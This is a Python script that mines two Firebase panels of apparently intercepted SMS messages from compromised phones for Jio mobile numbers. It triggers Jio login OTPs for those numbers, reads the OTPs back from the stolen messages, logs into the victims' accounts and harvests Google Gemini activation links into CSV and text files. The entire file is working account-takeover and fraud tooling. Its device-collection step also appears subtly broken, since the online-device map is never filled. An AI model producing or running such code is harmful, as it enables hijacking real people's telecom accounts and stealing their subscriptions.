#!/usr/bin/env python3
"""
Jio Gemini Pro Scanner — Dual Panel Edition
============================================
Scans both FirexPanel Firebase RTDBs for online devices, extracts mobile numbers,
sends Jio OTP, polls for OTP in messages, verifies, and extracts Gemini activation links.

Panels:
  1) https://chunnu-25c16-default-rtdb.firebaseio.com
  2) https://surakk-f709e-default-rtdb.firebaseio.com

Usage:
  python jio_gemini_pro.py              # Run with both panels
  python jio_gemini_pro.py --panel 1    # Only panel 1
  python jio_gemini_pro.py --panel 2    # Only panel 2
  python jio_gemini_pro.py --limit 10   # Limit to 10 devices
  python jio_gemini_pro.py --otp-timeout 30  # OTP timeout in seconds
"""

from __future__ import annotations

import argparse
import csv
import html
import json
import os
import re
import sys
import time
import traceback
from collections import Counter, defaultdict
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Optional
from urllib.parse import unquote, quote

import requests

# ── Configuration ──────────────────────────────────────────────────────────

PANELS = [
    {
        "name": "chunnu",
        "base_url": "https://chunnu-25c16-default-rtdb.firebaseio.com",
        "firebase_key": "",
        "id": 1,
    },
    {
        "name": "surakk",
        "base_url": "https://surakk-f709e-default-rtdb.firebaseio.com",
        "firebase_key": "",
        "id": 2,
    },
]

# Jio API Endpoints
CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

# Output files
RESULTS_FILE = Path("gemini_results.csv")
LINKS_FILE = Path("gemini_activation_links.txt")
LOG_FILE = Path("jio_gemini_log.jsonl")

# Regex patterns
NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\b(?:phone|mobile|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)
OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")
ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/"
    r"subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})"
    r"(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = (
    "serial_number", "device_id", "firebase_panel", "mobile_number",
    "status", "activation_url", "date", "time",
)


# ── Helpers ────────────────────────────────────────────────────────────────

def get_local_time() -> tuple[str, str]:
    """Get current date and time in IST (India Standard Time)."""
    utc_now = datetime.now(timezone.utc)
    ist_offset = timedelta(hours=5, minutes=30)
    ist_time = utc_now + ist_offset
    return ist_time.strftime("%Y-%m-%d"), ist_time.strftime("%I:%M:%S %p")


def clean_firebase_url(url: str) -> str:
    url = url.strip().replace(" ", "")
    if not url.startswith("https://"):
        url = "https://" + url
    return url


def clean_firebase_key(key: str) -> str:
    key = key.strip().replace(" ", "")
    if key.startswith("http"):
        return ""
    return key


def firebase_get(session: requests.Session, base_url: str, key: str, path: str,
                 params: Optional[dict] = None, max_retries: int = 3) -> Any:
    query = {}
    if key and not key.startswith("http"):
        query["auth"] = key
    if params:
        query.update(params)

    for attempt in range(max_retries):
        try:
            resp = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
            resp.raise_for_status()
            return resp.json()
        except Exception:
            if attempt == max_retries - 1:
                raise
            time.sleep(1 * (attempt + 1))
    return {}


def firebase_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Accept": "application/json",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    })
    return s


def jio_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return s


def response_json(response: requests.Response) -> dict:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}


def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}


def log_event(log_file: Path, event: dict):
    """Append JSONL log entry."""
    with log_file.open("a", encoding="utf-8") as f:
        f.write(json.dumps(event, ensure_ascii=False) + "\n")


# ── Jio API Functions ─────────────────────────────────────────────────────

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        resp = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(resp)
    return not response_error(resp) and bool(data.get("primaryService"))


def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        resp = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(resp)


def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        resp = session.post(
            VERIFY_OTP_URL,
            json={"mobileNumber": mobile, "otp": otp},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(resp)


def normalize_mobile(value) -> Optional[str]:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None


def extract_numbers_from_messages(messages: dict) -> set:
    found = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        # Also check from device data
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found


def wait_for_otp(firebase_session, base_url: str, key: str, device_id: str,
                 known_keys: set, jio_session, mobile: str, otp_timeout: int = 20,
                 poll_interval: int = 1) -> bool:
    used = set()
    deadline = time.monotonic() + otp_timeout
    while time.monotonic() < deadline:
        try:
            messages = firebase_get(
                firebase_session, base_url, key, f"messages/{device_id}",
                {"orderBy": '"$key"', "limitToLast": max(1, 20)}
            )
            if not isinstance(messages, dict):
                time.sleep(poll_interval)
                continue
        except requests.RequestException:
            time.sleep(poll_interval)
            continue

        candidates = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                otp = match.group(1)
                candidates.append((message_key, otp))

        if candidates:
            for mk, otp in candidates:
                used.add(mk)
                if verify_otp(jio_session, mobile, otp):
                    return True
        time.sleep(poll_interval)
    return False


def get_activation(session: requests.Session) -> tuple:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}

    try:
        auth_resp = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_resp)
        if not auth_resp.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""

        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)

        act_resp = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        act_data = response_json(act_resp)
        if already_active(api_message(act_data)):
            return "already_active", ""
        if not act_resp.ok or str(act_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""

        google_resp = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_resp)
        if already_active(api_message(google_data)):
            return "already_active", ""

        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""

        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass

        return "activation_url_found", url

    except requests.RequestException:
        return "activation_api_failed", ""


def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")


def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed", "already in use",
        "subscription already", "link has already been used",
        "already used"
    ))


def api_message(data: dict) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""


# ── File Output ────────────────────────────────────────────────────────────

def save_link(url: str):
    if not url:
        return
    existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
    if url in existing:
        return
    with LINKS_FILE.open("a", encoding="utf-8") as f:
        f.write(url + "\n")


def save_result(serial: int, device_id: str, panel_name: str, mobile: str, status: str, url: str):
    date, time_str = get_local_time()
    exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
    with RESULTS_FILE.open("a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=RESULT_FIELDS)
        if not exists:
            writer.writeheader()
        writer.writerow({
            "serial_number": serial,
            "device_id": device_id,
            "firebase_panel": panel_name,
            "mobile_number": mobile,
            "status": status,
            "activation_url": url,
            "date": date,
            "time": time_str,
        })


# ── Main Scanner Logic ────────────────────────────────────────────────────

def scan_panel(panel, firebase_key: str) -> dict:
    """Scan a Firebase panel for online devices."""
    firebase = firebase_session()
    try:
        clients = firebase_get(firebase, panel["base_url"], firebase_key, "clients")
        if not isinstance(clients, dict):
            return panel["id"], panel, {}

        devices = {}
        for device_id, data in clients.items():
            if isinstance(data, dict) and data.get("status") is True:
                devices[device_id] = {
                    "base_url": panel["base_url"],
                    "firebase_key": firebase_key,
                    "firebase_session": firebase,
                    "data": data,
                    "panel_id": panel["id"],
                    "panel_name": panel["name"],
                }
        return panel["id"], panel, devices
    except Exception as e:
        return panel["id"], panel, {"__error__": str(e)}


def scan_device(device_id: str, info: dict, message_limit: int = 150) -> tuple:
    """Scan messages for a device and extract numbers."""
    messages = firebase_get(
        info["firebase_session"],
        info["base_url"],
        info["firebase_key"],
        f"messages/{device_id}",
        {"orderBy": '"$key"', "limitToLast": max(1, message_limit)},
    )
    if not isinstance(messages, dict):
        return device_id, {}, set()

    numbers = extract_numbers_from_messages(messages)
    # Also check device data for mobile numbers
    dev_data = info.get("data", {})
    if isinstance(dev_data, dict):
        mob = normalize_mobile(dev_data.get("mobNo", ""))
        if mob:
            numbers.add(mob)
        sim_data = dev_data.get("sims", [])
        if isinstance(sim_data, list):
            for sim in sim_data:
                if isinstance(sim, dict):
                    mob = normalize_mobile(sim.get("phoneNumber", ""))
                    if mob:
                        numbers.add(mob)
    return device_id, messages, numbers


def main():
    parser = argparse.ArgumentParser(description="Jio Gemini Pro Scanner — Dual Panel Edition")
    parser.add_argument("--panel", type=int, choices=[1, 2], default=0,
                        help="Only scan panel 1 (chunnu) or panel 2 (surakk). 0 = both.")
    parser.add_argument("--limit", type=int, default=0,
                        help="Max devices to process (0 = all)")
    parser.add_argument("--otp-timeout", type=int, default=30,
                        help="OTP wait timeout in seconds (default: 30)")
    parser.add_argument("--poll-interval", type=int, default=1,
                        help="Polling interval in seconds (default: 1)")
    parser.add_argument("--message-limit", type=int, default=150,
                        help="Messages to scan per device (default: 150)")
    parser.add_argument("--threads", type=int, default=10,
                        help="Max concurrent threads (default: 10)")
    parser.add_argument("--retry", type=int, default=3,
                        help="Retry count for failed OTP checks (default: 3)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Scan devices and show results without processing OTPs")
    args = parser.parse_args()

    # Select panels
    selected_panels = PANELS
    if args.panel == 1:
        selected_panels = [p for p in PANELS if p["id"] == 1]
    elif args.panel == 2:
        selected_panels = [p for p in PANELS if p["id"] == 2]

    print("=" * 80)
    print("🚀 Jio Gemini Pro Scanner — Dual Panel Edition")
    print("=" * 80)
    panel_labels = ", ".join(f"#{p['id']} {p['name']}" for p in selected_panels)
    print(f"📊 Panels: {panel_labels}")
    print(f"   {selected_panels[0]['base_url']}")
    if len(selected_panels) > 1:
        print(f"   {selected_panels[1]['base_url']}")
    print(f"⚙️  OTP Timeout: {args.otp_timeout}s | Poll Interval: {args.poll_interval}s")
    print(f"📋 Message Limit: {args.message_limit} | Threads: {args.threads}")
    print("=" * 80)

    # ── STEP 1: Scan all panels for online devices ──
    print("\n📡 STEP 1: Scanning panels for online devices...")
    print("-" * 60)

    all_online_devices = {}
    panel_stats = {}

    # Simple concurrent scanning using threading
    import threading
    results_lock = threading.Lock()

    def scan_thread(panel):
        pid, p, devices = scan_panel(panel, panel.get("firebase_key", ""))
        with results_lock:
            panel_stats[pid] = {"panel": p, "devices": devices}

    threads = []
    for panel in selected_panels:
        t = threading.Thread(target=scan_thread, args=(panel,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    total_online = 0
    for pid, stats in sorted(panel_stats.items()):
        p = stats["panel"]
        devices = stats["devices"]
        if "__error__" in devices:
            print(f"  ❌ Panel #{p['id']} ({p['name']}): Error - {devices['__error__']}")
        else:
            count = len(devices)
            total_online += count
            print(f"  ✅ Panel #{p['id']} ({p['name']}): {count} online devices")
            if count > 0:
                sample_ids = list(devices.keys())[:3]
                for sid in sample_ids:
                    dev = devices[sid]
                    dev_data = dev.get("data", {})
                    info = ""
                    if isinstance(dev_data, dict):
                        if "modelName" in dev_data:
                            info += f" [{dev_data.get('modelName','?')}] "
                        if "ip_address" in dev_data:
                            info += f" IP:{dev_data.get('ip_address','?')} "
                        if "service_provider" in dev_data:
                            info += f" Net:{dev_data.get('service_provider','?')} "
                    print(f"      📱 {sid} (battery:{dev_data.get('battery','?')}{info})")

    print(f"\n📊 Total Online Devices: {total_online}")
    if not total_online:
        print("❌ No online devices found. Exiting.")
        return 1

    # ── STEP 2: Scan messages and extract unique numbers ──
    print(f"\n🔍 STEP 2: Scanning messages and collecting unique numbers...")
    print("-" * 60)

    mappings = defaultdict(set)  # mobile -> set of device_ids
    scanned = 0

    # Use a queue-based approach to avoid threading issues
    device_list = list(all_online_devices.items())

    def scan_single(device_id, info):
        mid, msgs, nums = scan_device(device_id, info, args.message_limit)
        for num in nums:
            mappings[num].add(device_id)

    # Sequential scanning for reliability (can switch to threads if needed)
    for device_id, info in device_list:
        scan_single(device_id, info)
        scanned += 1
        if scanned % 20 == 0 or scanned == len(device_list):
            print(f"   Scanned: {scanned}/{len(device_list)} devices, found {len(mappings)} unique numbers")

    targets = []
    for mobile, devs in sorted(mappings.items()):
        if devs:
            targets.append((sorted(devs)[0], mobile))

    print(f"\n📱 Total Unique Number Candidates: {len(targets)}")
    if not targets:
        print("❌ No numbers found. Exiting.")
        return 1

    # ── STEP 3: Process numbers (OTP + Activation) ──
    print(f"\n🔄 STEP 3: Starting OTP + Activation on {len(targets)} unique numbers...")
    print("=" * 80)

    jio = jio_session()
    statuses = Counter()
    serial = 0
    otp_timeout = args.otp_timeout
    poll_interval = args.poll_interval

    try:
        for target_device_id, mobile in targets:
            info = all_online_devices.get(target_device_id)
            if not info:
                continue

            serial += 1
            panel_name = info.get("panel_name", "unknown")
            panel_id = info.get("panel_id", "?")
            base_url = info["base_url"]
            firebase_key = info["firebase_key"]
            firebase_fb = info["firebase_session"]
            device_data = info.get("data", {})

            print(f"\n[{serial}/{len(targets)}] 📱 Device: {target_device_id} | "
                  f"Panel #{panel_id} ({panel_name}) | ending: {mobile[-4:]}")

            # Check device status
            if not isinstance(device_data, dict) or device_data.get("status") is not True:
                status, url = "device_offline", ""
                print(f"   ⚠️  Device offline")
            else:
                # Check if Jio number
                print(f"   🔎 Checking if Jio number...")
                if not is_jio_number(jio, mobile):
                    status, url = "not_jio_number", ""
                    print(f"   ❌ Not a Jio number")
                else:
                    print(f"   ✅ Jio number confirmed")

                    # Send OTP
                    print(f"   📤 Sending OTP...")
                    if not send_otp(jio, mobile):
                        status, url = "otp_send_failed", ""
                        print(f"   ❌ OTP send failed")
                    else:
                        print(f"   ✅ OTP sent successfully")

                        # Wait for OTP in Firebase messages
                        print(f"   ⏳ Waiting for OTP in messages (timeout: {otp_timeout}s)...")
                        known_keys = set()
                        # Get existing message keys
                        existing_msgs = firebase_get(
                            firebase_fb, base_url, firebase_key,
                            f"messages/{target_device_id}",
                            {"orderBy": '"$key"', "limitToLast": 100}
                        )
                        if isinstance(existing_msgs, dict):
                            known_keys = set(existing_msgs.keys())

                        otp_found = wait_for_otp(
                            firebase_fb, base_url, firebase_key,
                            target_device_id, known_keys,
                            jio, mobile, otp_timeout, poll_interval
                        )

                        if not otp_found:
                            status, url = "otp_failed", ""
                            print(f"   ❌ OTP not received within timeout")
                        else:
                            print(f"   ✅ OTP verified!")

                            # Get activation URL
                            print(f"   🔗 Extracting activation link...")
                            status, url = get_activation(jio)
                            if url:
                                print(f"   🎉 LINK -> {url}")
                            else:
                                print(f"   Status: {status}")

            statuses[status] += 1

            # Save results
            save_link(url)
            save_result(serial, target_device_id, panel_name, mobile, status, url)

            log_event(LOG_FILE, {
                "serial": serial,
                "device_id": target_device_id,
                "panel": panel_name,
                "mobile": mobile,
                "status": status,
                "url": url,
                "timestamp": datetime.now().isoformat(),
            })

            # Check for device offline after processing
            if isinstance(device_data, dict):
                try:
                    fresh_data = firebase_get(firebase_fb, base_url, firebase_key,
                                              f"clients/{target_device_id}")
                    if isinstance(fresh_data, dict) and fresh_data.get("status") is not True:
                        print(f"   ⚠️  Device went offline after processing")
                except:
                    pass

    except KeyboardInterrupt:
        print("\n\n⏹️  Interrupted by user. Saving partial results...")

    # ── Final Summary ──
    print("\n" + "=" * 80)
    print("📊 FINAL SUMMARY")
    print("=" * 80)
    print(f"  Total Online Devices : {total_online}")
    print(f"  Unique Numbers       : {len(targets)}")
    for status, count in sorted(statuses.items(), key=lambda x: -x[1]):
        emoji = {"activation_url_found": "🎉", "already_active": "⚠️",
                 "device_offline": "📴", "not_jio_number": "❌",
                 "otp_send_failed": "📤", "otp_failed": "⏱️",
                 "api_session_invalid": "🔑", "no_activation_url": "🔗",
                 "activation_api_failed": "💥"}.get(status, "❓")
        print(f"  {emoji} {status:25}: {count}")

    print(f"\n📁 Output Files:")
    print(f"  Results CSV : {RESULTS_FILE.resolve()}")
    print(f"  Activation Links : {LINKS_FILE.resolve()}")
    print(f"  Log file : {LOG_FILE.resolve()}")

    # Show success links
    activation_links = [s for s, c in statuses.items() if "activation" in s]
    if any(statuses.get(s, 0) > 0 for s in activation_links):
        print(f"\n🎯 Activation Links Found:")
        if LINKS_FILE.exists():
            links = LINKS_FILE.read_text().strip().split("\n")
            for link in links[-10:]:
                if link:
                    print(f"  🔗 {link}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
